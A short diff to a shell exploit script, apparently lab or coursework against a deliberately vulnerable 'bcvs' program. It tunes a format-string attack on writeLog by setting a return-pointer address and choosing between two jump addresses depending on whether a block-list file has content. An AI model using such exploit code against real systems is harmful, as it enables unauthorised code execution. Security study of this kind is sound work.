@@ -321,7 +321,13 @@ touch temp_file
 
 OFFSET=0
 RET_PTR_LOC="bffff56C"  # The frame for writeLog shouldn't come before this
-ATTACK_JMP_ADDR="804C328"
+ATTACK_JMP_ADDR="804C328"  # This is the address with an empty block list
+ATTACK_JMP_ADDR2="804C36B" # Use this one when there is content in the block list
+
+if [[ -s ".bcvs/block.list" ]]; then
+  echo "Block list has content. Using ATTACK_JMP_ADDR2=$ATTACK_JMP_ADDR2"
+  ATTACK_JMP_ADDR=$ATTACK_JMP_ADDR2
+fi
 
 # Now that we store the address part of the format string on the stack in main
 # this is no longer necessary
